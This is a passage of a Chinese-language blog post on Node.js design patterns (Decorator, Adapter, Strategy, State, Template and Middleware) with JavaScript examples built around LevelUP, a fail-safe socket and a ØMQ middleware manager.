id="Decorating-a-LevelUP-database-装饰一个-LevelUP-数据库"><a href="#Decorating-a-LevelUP-database-装饰一个-LevelUP-数据库" class="headerlink" title="Decorating a LevelUP database(装饰一个 LevelUP 数据库)"></a>Decorating a LevelUP database(装饰一个 LevelUP 数据库)</h3><h4 id="Introducing-LevelUP-and-LevelDB-介绍-LevelUP-和-LevelDB"><a href="#Introducing-LevelUP-and-LevelDB-介绍-LevelUP-和-LevelDB" class="headerlink" title="Introducing LevelUP and LevelDB(介绍 LevelUP 和 LevelDB)"></a>Introducing LevelUP and LevelDB(介绍 LevelUP 和 LevelDB)</h4><p><a href="https://www.npmjs.com/package/levelup" target="_blank" rel="noopener">LevelUP</a> 是 <code>Google</code> 的 <code>LevelDB</code> 上的一个 <code>Node.js</code> 包装器，它是最初为了在 <code>Chrome</code> 浏览器中实现 <code>IndexedDB</code> 而创建的 <code>key/value</code> 存储库。详细的 <code>LevelUP</code> 生态可查看 <a href="https://github.com/rvagg/node-levelup/wiki/Modules" target="_blank" rel="noopener">https://github.com/rvagg/node-levelup/wiki/Modules</a>。</p><h4 id="Implementing-a-LevelUP-plugin"><a href="#Implementing-a-LevelUP-plugin" class="headerlink" title="Implementing a LevelUP plugin"></a>Implementing a LevelUP plugin</h4><p>我们想要构建的是一个 <code>LevelUP</code> 的插件，当将具有特定模式的对象保存到数据库时让我们接到通知。例如如果我们订阅 <code>{a:1}</code> 模式，那么当类似 <code>{a:1,b:3}</code> 或 <code>{a:1,c:&#39;x&#39;}</code> 的数据存储到数据库时，我们会收到一个通知。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">levelSubscribe</span>(<span class="params">db</span>) </span>&#123;</span><br><span class="line">  db.subscribe = <span class="function">(<span class="params">pattern, listener</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//[1]</span></span><br><span class="line">    db.on(<span class="string">'put'</span>, (key, val) =&gt; &#123;</span><br><span class="line">      <span class="comment">//[2]</span></span><br><span class="line">      <span class="keyword">const</span> match = <span class="built_in">Object</span>.keys(pattern).every(</span><br><span class="line">        k =&gt; pattern[k] === val[k] <span class="comment">//[3]</span></span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (match) &#123;</span><br><span class="line">        listener(key, val) <span class="comment">//[4]</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> db</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用对象增强的方法直接将新方法附加到 <code>db</code> 实例上。</p><h2 id="Adapter-适配器模式"><a href="#Adapter-适配器模式" class="headerlink" title="Adapter(适配器模式)"></a>Adapter(适配器模式)</h2><p>适配器模式其实是包装接口来供不同的调用，例如升级接口后用适配器包装新接口给老代码调用。</p><p><img src="/assets/img/adapter.png" alt="Adapter"></p><h3 id="Using-LevelUP-througn-the-filesystem-API-通过-fs-的-API-来使用-LevelUP"><a href="#Using-LevelUP-througn-the-filesystem-API-通过-fs-的-API-来使用-LevelUP" class="headerlink" title="Using LevelUP througn the filesystem API(通过 fs 的 API 来使用 LevelUP)"></a>Using LevelUP througn the filesystem API(通过 fs 的 API 来使用 LevelUP)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">createFsAdapter</span>(<span class="params">db</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> fs = &#123;&#125;</span><br><span class="line">  fs.readFile = <span class="function"><span class="keyword">function</span>(<span class="params">filename, options, callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> options === <span class="string">'function'</span>) &#123;</span><br><span class="line">      callback = options</span><br><span class="line">      options = &#123;&#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> options === <span class="string">'string'</span>) &#123;</span><br><span class="line">      options = &#123;</span><br><span class="line">        encoding: options</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    db.get(</span><br><span class="line">      path.resolve(filename),</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">//[1]</span></span><br><span class="line">        valueEncoding: options.encoding</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="function"><span class="keyword">function</span>(<span class="params">err, value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">if</span> (err.type === <span class="string">'NotFoundError'</span>) &#123;</span><br><span class="line">            <span class="comment">//[2]</span></span><br><span class="line">            err = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"ENOENT, open '"</span> + filename + <span class="string">"'"</span>)</span><br><span class="line">            err.code = <span class="string">'ENOENT'</span></span><br><span class="line">            err.errno = <span class="number">34</span></span><br><span class="line">            err.path = filename</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> callback &amp;&amp; callback(err)</span><br><span class="line">        &#125;</span><br><span class="line">        callback &amp;&amp; callback(<span class="literal">null</span>, value) <span class="comment">//[3]</span></span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fs.writeFile = <span class="function">(<span class="params">filename, contents, options, callback</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> options === <span class="string">'function'</span>) &#123;</span><br><span class="line">    callback = options</span><br><span class="line">    options = &#123;&#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> options === <span class="string">'string'</span>) &#123;</span><br><span class="line">    options = &#123; <span class="attr">encoding</span>: options &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  db.put(</span><br><span class="line">    path.resolve(filename),</span><br><span class="line">    contents,</span><br><span class="line">    &#123;</span><br><span class="line">      valueEncoding: options.encoding</span><br><span class="line">    &#125;,</span><br><span class="line">    callback</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> fs</span><br></pre></td></tr></table></figure><h3 id="In-the-wild-2"><a href="#In-the-wild-2" class="headerlink" title="In the wild"></a>In the wild</h3><p><code>LevelUP</code> 能在浏览器中能以不同的存储后端运行，从 <code>LevelDB</code> 到 <code>IndexedDB</code>。这是通过那些适应了内部 <code>LevelUP API</code> 接口的适配器(<code>Adapter</code>)来实现的。具体有哪些实现方式查看 <a href="https://github.com/rvagg/node-levelup/wiki/Modules#storage-back-ends" target="_blank" rel="noopener">https://github.com/rvagg/node-levelup/wiki/Modules#storage-back-ends</a>。</p><h2 id="Strategy-策略模式"><a href="#Strategy-策略模式" class="headerlink" title="Strategy(策略模式)"></a>Strategy(策略模式)</h2><p><img src="/assets/img/strategy.png" alt="Strategy"></p><p>从图中看出该模式其实是根据配置(或用户输入之类)来做不同逻辑的事，都实现了相同的接口。比大量的 <code>if...else</code> 或 <code>swtich</code> 更易懂。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> objectPath = <span class="built_in">require</span>(<span class="string">'object-path'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(strategy) &#123;</span><br><span class="line">    <span class="keyword">this</span>.data = &#123;&#125;</span><br><span class="line">    <span class="keyword">this</span>.strategy = strategy</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  get(path) &#123;</span><br><span class="line">    <span class="keyword">return</span> objectPath.get(<span class="keyword">this</span>.data, path)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set(path, value) &#123;</span><br><span class="line">    <span class="keyword">return</span> objectPath.set(<span class="keyword">this</span>.data, path, value)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  read(file) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Deserializing from <span class="subst">$&#123;file&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">this</span>.data = <span class="keyword">this</span>.strategy.deserialize(fs.readFileSync(file, <span class="string">'utf-8'</span>))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  save(file) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Serializing to <span class="subst">$&#123;file&#125;</span>`</span>)</span><br><span class="line">    fs.writeFileSync(file, <span class="keyword">this</span>.strategy.serialize(<span class="keyword">this</span>.data))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = Config</span><br></pre></td></tr></table></figure><p>上面代码可以传入不同的配置来做不同的序列化与反序列化：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// strategy 1</span></span><br><span class="line"><span class="built_in">module</span>.exports.json = &#123;</span><br><span class="line">  deserialize: <span class="function"><span class="params">data</span> =&gt;</span> <span class="built_in">JSON</span>.parse(data),</span><br><span class="line">  serialize: <span class="function"><span class="params">data</span> =&gt;</span> <span class="built_in">JSON</span>.stringify(data, <span class="literal">null</span>, <span class="string">'  '</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// strategy 2</span></span><br><span class="line"><span class="keyword">const</span> ini = <span class="built_in">require</span>(<span class="string">'ini'</span>) <span class="comment">// https://npmjs.org/package/ini</span></span><br><span class="line"><span class="built_in">module</span>.exports.ini = &#123;</span><br><span class="line">  deserialize: <span class="function"><span class="params">data</span> =&gt;</span> ini.parse(data),</span><br><span class="line">  serialize: <span class="function"><span class="params">data</span> =&gt;</span> ini.stringify(data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="State-状态模式"><a href="#State-状态模式" class="headerlink" title="State(状态模式)"></a>State(状态模式)</h2><p>状态模式是策略模式的变种，策略模式一旦确定策略在整个过程中策略(也就是处理逻辑不变)，而状态模式可以动态地改变状态来间接地影响策略：</p><p><img src="/assets/img/state.png" alt="State"></p><p>想象一下，我们有一个酒店预订系统和一个 <code>Reservation</code> 对象来模拟房间预订。</p><p>这是一个经典的情况，我们必须根据其状态来调整对象的行为。考虑以下一系列事件：</p><ul><li>当订单初始创建时，用户可以使用 <code>confirm()</code> 方法确认订单；当然，他们不能使用 <code>cancel()</code> 方法取消预约，因为订单还没有被确认。但是，如果他们在购买之前改变主意，他们可以使用 <code>delete()</code> 方法删除它。</li><li>一旦确认订单，再次使用 <code>confirm()</code> 方法没有任何意义；不过，现在应该可以取消预约，但不能再删除，因为要保留对应记录。</li><li>在预约日期前一天，不应取消订单。因为这太迟了。</li></ul><h3 id="Implementing-a-basic-fail-safe-socket-实现一个基本的-fail-safe-socket"><a href="#Implementing-a-basic-fail-safe-socket-实现一个基本的-fail-safe-socket" class="headerlink" title="Implementing a basic fail-safe socket(实现一个基本的 fail-safe socket)"></a>Implementing a basic fail-safe socket(实现一个基本的 fail-safe socket)</h3><p>尝试一个例子，建立一个 <code>socket</code>，当与服务器断开连接时保存客户端的请求，并将这些请求按顺序排队，等到下次重新连接时按照顺序一一请求。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file offlineState.js</span></span><br><span class="line"><span class="keyword">const</span> jot = <span class="built_in">require</span>(<span class="string">'json-over-tcp'</span>) <span class="comment">// [1]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="class"><span class="keyword">class</span> <span class="title">OfflineState</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(failsafeSocket) &#123;</span><br><span class="line">    <span class="keyword">this</span>.failsafeSocket = failsafeSocket</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  send(data) &#123;</span><br><span class="line">    <span class="comment">// [2]</span></span><br><span class="line">    <span class="keyword">this</span>.failsafeSocket.queue.push(data)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  activate() &#123;</span><br><span class="line">    <span class="comment">// [3]</span></span><br><span class="line">    <span class="keyword">const</span> retry = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">this</span>.activate(), <span class="number">500</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.failsafeSocket.socket = jot.connect(</span><br><span class="line">      <span class="keyword">this</span>.failsafeSocket.options,</span><br><span class="line">      () =&gt; &#123;</span><br><span class="line">        <span class="keyword">this</span>.failsafeSocket.socket.removeListener(<span class="string">'error'</span>, retry)</span><br><span class="line">        <span class="keyword">this</span>.failsafeSocket.changeState(<span class="string">'online'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">this</span>.failsafeSocket.socket.once(<span class="string">'error'</span>, retry)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file onlineState.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="class"><span class="keyword">class</span> <span class="title">OnlineState</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(failsafeSocket) &#123;</span><br><span class="line">    <span class="keyword">this</span>.failsafeSocket = failsafeSocket</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  send(data) &#123;</span><br><span class="line">    <span class="comment">// [1]</span></span><br><span class="line">    <span class="keyword">this</span>.failsafeSocket.socket.write(data)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  activate() &#123;</span><br><span class="line">    <span class="comment">// [2]</span></span><br><span class="line">    <span class="keyword">this</span>.failsafeSocket.queue.forEach(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.failsafeSocket.socket.write(data)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">this</span>.failsafeSocket.queue = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.failsafeSocket.socket.once(<span class="string">'error'</span>, () =&gt; &#123;</span><br><span class="line">      <span class="keyword">this</span>.failsafeSocket.changeState(<span class="string">'offline'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file failsafeSocket.js</span></span><br><span class="line"><span class="keyword">const</span> OfflineState = <span class="built_in">require</span>(<span class="string">'./offlineState'</span>)</span><br><span class="line"><span class="keyword">const</span> OnlineState = <span class="built_in">require</span>(<span class="string">'./onlineState'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FailsafeSocket</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(options) &#123;</span><br><span class="line">    <span class="comment">// [1]</span></span><br><span class="line">    <span class="keyword">this</span>.options = options</span><br><span class="line">    <span class="keyword">this</span>.queue = []</span><br><span class="line">    <span class="keyword">this</span>.currentState = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">this</span>.socket = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">this</span>.states = &#123;</span><br><span class="line">      offline: <span class="keyword">new</span> OfflineState(<span class="keyword">this</span>),</span><br><span class="line">      online: <span class="keyword">new</span> OnlineState(<span class="keyword">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.changeState(<span class="string">'offline'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  changeState(state) &#123;</span><br><span class="line">    <span class="comment">// [2]</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Activating state: '</span> + state)</span><br><span class="line">    <span class="keyword">this</span>.currentState = <span class="keyword">this</span>.states[state]</span><br><span class="line">    <span class="keyword">this</span>.currentState.activate()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  send(data) &#123;</span><br><span class="line">    <span class="comment">// [3]</span></span><br><span class="line">    <span class="keyword">this</span>.currentState.send(data)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">options</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> FailsafeSocket(options)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>FailsafeSocket</code> 从一个状态切换到另一个状态，只是切换了实例，具体的发送方法根据状态来选择，离线则使用 <code>OfflineState</code> 来发送，连接则使用 <code>OnlineState</code> 来发送。</p><h2 id="Template-模板模式"><a href="#Template-模板模式" class="headerlink" title="Template(模板模式)"></a>Template(模板模式)</h2><p>和策略模式差不多，只是需要预先定义变体，使用继承改变原有的方法，注意在 <code>js</code> 中模板类是总是抛出异常的类或未定义的方法(因为一定要有实现类才能使用)。</p><p><img src="/assets/img/template.png" alt="Template"></p><h3 id="In-the-wild-3"><a href="#In-the-wild-3" class="headerlink" title="In the wild"></a>In the wild</h3><p>其实在第五章中流的实现就是用了这种模式，自定义的流需要实现 <code>_read</code> 和 <code>_write</code> 这类的方法。</p><h2 id="Middleware-中间件模式"><a href="#Middleware-中间件模式" class="headerlink" title="Middleware(中间件模式)"></a>Middleware(中间件模式)</h2><h3 id="Middleware-in-Express-Express-中的中间件"><a href="#Middleware-in-Express-Express-中的中间件" class="headerlink" title="Middleware in Express(Express 中的中间件)"></a>Middleware in Express(Express 中的中间件)</h3><p>在 <code>Express</code> 中，中间件表示一组服务，通常是函数，它们被组织在一个 <code>pipeline</code> 中，负责处理传入的 <code>HTTP</code> 请求和进行响应。</p><p>一个 <code>Express</code> 的中间件有下面这种形式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123; ... &#125;</span><br></pre></td></tr></table></figure><p>在这里，<code>req</code> 是传入的 <code>HTTP</code> 请求，<code>res</code> 是响应，<code>next</code> 是当前中间件完成其任务时调用的回调，用来触发 <code>pipeline</code> 中的下一个中间件。可能的 <code>Express</code> 中间件任务有:</p><ul><li>解析请求的 <code>body</code></li><li>压缩/解压 <code>req</code> 和 <code>res</code> 对象</li><li>生成访问日志</li><li>管理 <code>sessions</code></li><li>管理加密的 <code>cookie</code></li><li>提供跨站请求伪造（<code>CSRF</code>）保护</li></ul><p>这些都是与应用程序的主要业务逻辑没有严格关联的任务，也不是 Web 服务器最核心的部分；它们是应用程序公共功能的中间件，使得实际的请求处理程序只关注其主要业务逻辑。</p><h3 id="Middleware-as-a-pattern-中间件作为一种模式"><a href="#Middleware-as-a-pattern-中间件作为一种模式" class="headerlink" title="Middleware as a pattern(中间件作为一种模式)"></a>Middleware as a pattern(中间件作为一种模式)</h3><p>其实类似于 <code>Pipe-Filter</code> 模式，通过看一张图更能明白：</p><p><img src="/assets/img/middleware.png" alt="Middleware"></p><p>最重要的就是这个 <code>Middleware Manager</code>，负责组织和执行中间件功能。</p><ol><li>新的中间件通过 <code>use()</code>(一般约定，当然也可以用别的名称) 来注册，一般是管道末尾。</li><li>注册的中间件在异步顺序执行流中被调用，后一个的输入是前一个中间件的输出。</li><li>中间件只负责处理正常流程，错误通常会触发另一个专门的中间件序列。</li></ol><h3 id="Creating-a-middleware-for-OMQ-为-OMQ-创建一个中间件框架"><a href="#Creating-a-middleware-for-OMQ-为-OMQ-创建一个中间件框架" class="headerlink" title="Creating a middleware for ØMQ(为 ØMQ 创建一个中间件框架)"></a>Creating a middleware for ØMQ(为 ØMQ 创建一个中间件框架)</h3><p><code>ØMQ</code>（也称为 <code>ZMQ</code> 或 <code>ZeroMQ</code>）提供了一个简单的接口，用于通过各种协议在网络中交换原子消息；它的性能绝佳，其基本的抽象集是专门构建的，以促进自定义消息体系结构的实现。因此，经常选择 <code>ØMQ</code> 来构建复杂的分布式系统。</p><p>我们将构建一个中间件基础结构，以抽象通过 <code>ØMQ</code> 套接字传递的数据的预处理和后处理，以便我们可以透明地处理 <code>JSON</code> 对象，同时无缝地压缩通过线路传递的消息。</p><h4 id="The-Middleware-Manager-中间件管理器"><a href="#The-Middleware-Manager-中间件管理器" class="headerlink" title="The Middleware Manager(中间件管理器)"></a>The Middleware Manager(中间件管理器)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="class"><span class="keyword">class</span> <span class="title">ZmqMiddlewareManager</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(socket) &#123;</span><br><span class="line">    <span class="keyword">this</span>.socket = socket</span><br><span class="line">    <span class="keyword">this</span>.inboundMiddleware = [] <span class="comment">// [1]</span></span><br><span class="line">    <span class="keyword">this</span>.outboundMiddleware = []</span><br><span class="line">    socket.on(<span class="string">'message'</span>, message =&gt; &#123;</span><br><span class="line">      <span class="comment">// [2]</span></span><br><span class="line">      <span class="keyword">this</span>.executeMiddleware(<span class="keyword">this</span>.inboundMiddleware, &#123;</span><br><span class="line">        data: message</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  send(data) &#123;</span><br><span class="line">    <span class="keyword">const</span> message = &#123;</span><br><span class="line">      data: data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.executeMiddleware(<span class="keyword">this</span>.outboundMiddleware, message, () =&gt; &#123;</span><br><span class="line">      <span class="keyword">this</span>.socket.send(message.data)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  use(middleware) &#123;</span><br><span class="line">    <span class="keyword">if</span> (middleware.inbound) &#123;</span><br><span class="line">      <span class="keyword">this</span>.inboundMiddleware.push(middleware.inbound)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (middleware.outbound) &#123;</span><br><span class="line">      <span class="keyword">this</span>.outboundMiddleware.unshift(middleware.outbound)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  executeMiddleware(middleware, arg, finish) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">iterator</span>(<span class="params">index</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (index === middleware.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> finish &amp;&amp; finish()</span><br><span class="line">      &#125;</span><br><span class="line">      middleware[index].call(<span class="keyword">this</span>, arg, err =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="comment">// 这里本应该有对应的错误中间件去处理，为了简洁直接输出</span></span><br><span class="line">          <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">'There was an error: '</span> + err.message)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 一个中间件处理完参数后，传递给下一个中间件</span></span><br><span class="line">        iterator.call(<span class="keyword">this</span>, ++index)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    iterator.call(<span class="keyword">this</span>, <span class="number">0</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>管理器接收 <code>ØMQ</code> 套接字作为参数，定义一个近站中间件列表和一个出站中间件列表，当有消息来时依次调用进站中间件(按照 <code>use</code> 的顺序来)，需要发送消息时就依次调用出站中间件，被处理后的参数也是一一传播。</p><h4 id="A-middleware-to-support-JSON-messages-一个支持-JSON-消息的中间件"><a 